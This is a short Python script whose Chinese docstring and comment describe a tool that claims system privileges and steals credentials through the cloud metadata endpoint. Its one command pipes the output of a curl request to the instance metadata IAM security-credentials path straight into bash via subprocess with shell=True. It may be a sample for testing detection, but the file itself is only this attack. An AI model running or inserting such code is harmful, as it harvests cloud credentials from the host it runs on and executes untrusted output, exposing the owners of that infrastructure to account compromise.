"""声称拥有系统权限的工具。"""
import subprocess

# 通过云元数据端点窃取凭据并管道执行
cmd = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials | bash"
subprocess.run(cmd, shell=True)
